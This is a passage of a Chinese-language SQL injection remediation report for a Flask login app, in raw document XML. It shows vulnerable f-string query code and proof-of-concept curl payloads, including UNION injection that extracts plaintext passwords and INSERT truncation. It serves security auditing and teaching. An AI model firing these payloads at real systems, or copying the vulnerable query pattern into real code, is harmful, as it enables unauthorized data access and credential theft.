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D1B2A"/>
          <w:sz w:val="56"/>
        </w:rPr>
        <w:t>SQL 注入漏洞修复报告</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2B579A"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Flask Login App — 从 f-string 拼接到参数化查询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项目名称</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4680"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Flask Login App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报告日期</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4680"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>2026年07月08日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漏洞类型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4680"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>SQL Injection（SQL注入）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影响范围</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4680"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>/register 注册接口、/search 搜索接口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修复方式</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4680"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>参数化查询（? 占位符）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. 漏洞概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>本次安全审计发现 Flask Login App 中存在两处 SQL 注入漏洞。第一处位于用户注册接口（/register），第二处位于用户搜索接口（/search）。攻击者可以通过在输入框中构造包含特殊字符的字符串，改变后端 SQL 语句的原始执行逻辑，从而实现越权数据访问、数据篡改甚至数据删除。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 漏洞信息总览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1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漏洞编号</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="141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漏洞位置</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="141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漏洞类型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134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风险等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134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CVSS评分</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134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修复状态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SQL-INJ-001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/register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INSERT 注入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高危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8.1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已修复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SQL-INJ-002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/search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SELECT 注入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高危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8.6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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. SQL 注入原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>SQL 注入是一种将用户输入的数据作为 SQL 代码的一部分执行的攻击方式。它的本质是：程序在构建 SQL 语句时，直接将用户输入的内容拼接到 SQL 字符串中，而没有对用户输入中的特殊字符（如单引号、分号、注释符）进行任何处理。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 正常执行流程</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>以下是一条正常的 SQL 查询语句的构建过程。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>Python 代码中的 SQL 模板：</w:t>
        <w:br/>
        <w:t>keyword = "admin"</w:t>
        <w:br/>
        <w:t>sql = f"SELECT * FROM users WHERE username LIKE '%{keyword}%'"</w:t>
        <w:br/>
        <w:br/>
        <w:t>实际发送给数据库的 SQL：</w:t>
        <w:br/>
        <w:t>SELECT * FROM users WHERE username LIKE '%admin%'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>用户输入的是普通文字 "admin"，它被原样放进了 LIKE 运算符后面的字符串里。数据库执行这条 SQL，返回 username 字段包含 "admin" 的所有用户。这个流程本身没有问题，因为用户输入的内容是纯文本。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 注入执行流程</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>如果用户输入的不是普通文字，而是带有 SQL 语法特殊字符的字符串，情况就会发生变化。假设用户在搜索框输入以下内容：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>用户在搜索框输入的内容：' OR '1'='1</w:t>
        <w:br/>
        <w:br/>
        <w:t>Python 代码拼接后的 SQL：</w:t>
        <w:br/>
        <w:t>keyword = "' OR '1'='1"</w:t>
        <w:br/>
        <w:t>sql = f"SELECT * FROM users WHERE username LIKE '%{keyword}%'"</w:t>
        <w:br/>
        <w:br/>
        <w:t>实际发送给数据库的 SQL：</w:t>
        <w:br/>
        <w:t>SELECT * FROM users WHERE username LIKE '%' OR '1'='1%'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>这条 SQL 语句需要拆开来看才能理解发生了什么。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>对照原始模板：WHERE username LIKE '%{keyword}%'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>用户输入的内容 "' OR '1'='1" 替换了 {keyword} 之后，SQL 变成了：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    WHERE username LIKE '%' OR '1'='1%'</w:t>
        <w:br/>
        <w:t xml:space="preserve">    第1部分：'%' 匹配了全部用户名（LIKE '%' 表示所有字符串都匹配）。    这是因为用户输入的第一个单引号提前闭合了 LIKE 的字符串。</w:t>
        <w:br/>
        <w:t xml:space="preserve">    第2部分：OR '1'='1 是一个永远为真的条件（'1' 永远等于 '1'）。</w:t>
        <w:br/>
        <w:t xml:space="preserve">    第3部分：剩下的 %' 不会影响执行结果。</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    所以这条 SQL 实际等价于：SELECT * FROM users</w:t>
        <w:br/>
        <w:t xml:space="preserve">    也就是返回 users 表中的全部数据。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 SQL 注入的常见攻击类型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1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攻击类型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="28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原理说明</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="255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造成的后果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OR 注入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构造永远为真的条件（如 OR 1=1），绕过 WHERE 子句的限制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越权查看本不该返回的数据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UNION 注入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用 UNION 关键字追加第二条 SELECT 语句，合并返回结果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伪造数据行、从其他表读取数据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注释注入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用 -- 或 # 将 SQL 语句的剩余部分变成注释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破坏 SQL 语句的完整性，跳过后续条件检查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联合查询窃取数据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UNION SELECT 指定读取 password 等敏感字段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窃取其他用户的密码、个人信息等敏感数据</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. 漏洞源代码分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>以下分别列出注册接口和搜索接口在修复前的源代码，并标注存在 SQL 注入漏洞的具体位置。两处漏洞的根因完全相同：都使用了 Python 的 f-string 将用户输入直接嵌入 SQL 字符串。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 注册接口（/register）的漏洞代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@app.route("/register", methods=["GET", "POST"])</w:t>
        <w:br/>
        <w:t>def register():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if request.method == "POST":</w:t>
        <w:br/>
        <w:t xml:space="preserve">        username = request.form.get("username", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        password = request.form.get("password", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        email = request.form.get("email", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        phone = request.form.get("phone", "")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        sql = f"INSERT INTO users (username, password, email, phone) \</w:t>
        <w:br/>
        <w:t xml:space="preserve">               VALUES ('{username}', '{password}', '{email}', '{phone}')</w:t>
        <w:br/>
        <w:t xml:space="preserve">        c.execute(sql)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞分析：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>第 8 行使用 Python 的 f-string，把用户输入的 username、password、email、phone 直接嵌入到 SQL 语句的 VALUES 部分。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>如果用户在用户名字段输入：a'); --</w:t>
        <w:br/>
        <w:t>拼出来的 SQL 就变成了：</w:t>
        <w:br/>
        <w:t>INSERT INTO users (...) VALUES ('a'); --', 'password', 'email', 'phone')</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>分号提前结束了 INSERT 语句，-- 把后面的内容变成了注释。数据库只执行了 INSERT INTO users VALUES ('a')，其他三列变成空值。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 搜索接口（/search）的漏洞代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@app.route("/search")</w:t>
        <w:br/>
        <w:t>def search():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    keyword = request.args.get("keyword", "")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    sql = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' \</w:t>
        <w:br/>
        <w:t xml:space="preserve">           OR email LIKE '%{keyword}%'"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(f"[SQL] {sql}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    c.execute(sql)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞分析：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>第 4 行同样使用 f-string，把 URL 参数 keyword 直接拼接到 WHERE 子句中。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>keyword 中如果包含单引号，就能提前闭合 LIKE 的字符串，然后注入任意 SQL 代码。例如输入 ' OR '1'='1 就能让 WHERE 条件变成永真。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 两处漏洞的共同点</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>两处漏洞的根因完全相同：使用 f-string 将用户输入直接嵌入 SQL 字符串。数据库收到的是一条完整的 SQL 字符串，它无法区分哪部分是程序员写的合法 SQL 结构，哪部分是攻击者注入的恶意代码——因为 f-string 已经把它们混在了一起。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. 攻击复现（POC）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>以下为实际验证过的攻击案例。每一条命令都在真实系统中执行并确认有效。所有 POC 都以 curl 命令的形式给出，可以直接在终端运行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 POC 1：OR 注入 — 搜索全部用户</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>攻击原理：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>在搜索框输入的内容中包含单引号，用来闭合 LIKE 运算符后面的字符串。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>然后输入 OR '1'='1，这是一个永远为真的条件，使 WHERE 子句的限制失效。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>数据库最终执行的是 SELECT * FROM users，返回表中所有用户。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>攻击命令：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>curl "http://192.168.182.130:5000/search?keyword=%27%20OR%20%271%27%3D%271"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>这条命令中 URL 编码部分的含义：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1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编码前字符</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="141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 编码</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969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'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%27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单引号，用于闭合 SQL 中的字符串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%20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空格，分隔 SQL 关键字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=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%3D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等号，用于条件判断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>所以 %27%20OR%20%271%27%3D%271 解码后就是：' OR '1'='1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>实际执行后生成的 SQL：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>SELECT * FROM users WHERE username LIKE '%' OR '1'='1%' OR email LIKE '%' OR '1'='1%'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>执行结果：返回 users 表中全部 3 条用户记录（admin、alice、testuser），而不是只返回当前登录用户。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 POC 2：UNION 注入 — 伪造数据</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>攻击原理：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>在搜索框中输入的内容闭合 LIKE 字符串后，使用 UNION 关键字追加一条新的 SELECT 语句。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>UNION 的作用是将两个 SELECT 的结果合并在一起返回。第一个 SELECT 返回数据库中的真实用户，第二个 SELECT 返回攻击者指定的任意数据。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>users 表有 5 个字段（id, username, password, email, phone），因此 UNION SELECT 也必须提供 5 个值，否则数据库会报错。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>攻击命令：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>curl "http://192.168.182.130:5000/search?keyword=%27%20UNION%20SELECT%201,%27HACKED%27,%27pw%27,%27hack%40x.com%27,%27999%27--"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>解码后的注入内容：' UNION SELECT 1,'HACKED','pw','hack@x.com','999'--</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>其中 %40 是 @ 的 URL 编码，-- 是 SQL 注释符，用于注释掉 SQL 模板中剩余的部分。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>实际执行后生成的 SQL：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>SELECT * FROM users WHERE username LIKE '%' UNION SELECT 1,'HACKED','pw','hack@x.com','999'--%'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>执行结果：页面同时显示数据库中的真实用户和一条伪造的 HACKED 用户记录。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 POC 3：UNION 窃取密码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>攻击原理：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>与 POC 2 同样的 UNION 注入手法，但 UNION SELECT 读取的是 users 表中 password 字段的实际值。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>因为 password 字段是 users 表的第 3 列，所以 UNION SELECT 的第 3 个值设为 password。这样 UNION 返回的数据中就包含了其他用户的密码。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>攻击命令：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>curl "http://192.168.182.130:5000/search?keyword=%27%20UNION%20SELECT%201,username,password,email,phone%20FROM%20users--"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>实际执行后生成的 SQL：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>SELECT * FROM users WHERE username LIKE '%' UNION SELECT 1,username,password,email,phone FROM users--%'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>执行结果：页面上显示所有用户的 username、password、email、phone 字段。密码以明文形式暴露。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.4 POC 4：注册注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>攻击原理：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>注册接口的 SQL 是 INSERT 语句，攻击方式与 SELECT 不同。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>在用户名字段中输入的内容包含单引号和括号，用来闭合 VALUES 子句。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>然后使用分号结束当前 INSERT 语句，再用 -- 注释掉 SQL 模板中剩余的部分。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>攻击命令：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>curl http://192.168.182.130:5000/register \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "username=a%27)%3B%20--&amp;password=ignored&amp;email=x&amp;phone=x"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>命令说明：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>-d 参数表示 POST 请求的请求体数据。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>%27 是单引号，%29 是右括号，%3B 是分号，%20 是空格。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>解码后 username 的值为：a'); --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>实际执行后生成的 SQL：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>INSERT INTO users (username, password, email, phone)</w:t>
        <w:br/>
        <w:t>VALUES ('a'); --', 'ignored', 'x', 'x')</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>执行结果：数据库只执行了 INSERT INTO users (username) VALUES ('a')，其他三列使用空值填充。-- 将后面的内容全部变成了注释，不会被执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.5 Burp Suite 测试方法</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>Burp Suite 是一款常用的 Web 安全测试工具，可以通过代理拦截和修改 HTTP 请求，方便地对 SQL 注入漏洞进行测试和验证。以下是使用 Burp Suite 测试本系统 SQL 注入漏洞的完整步骤。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.5.1 环境配置</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>步骤一：启动 Burp Suite 并配置代理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>打开 Burp Suite，选择 "Proxy" 标签页。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>点击 "Proxy Settings"，确认监听地址为 127.0.0.1:8080。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>如果默认端口被占用，可以改为其他端口，如 127.0.0.1:8081。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>步骤二：配置浏览器代理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
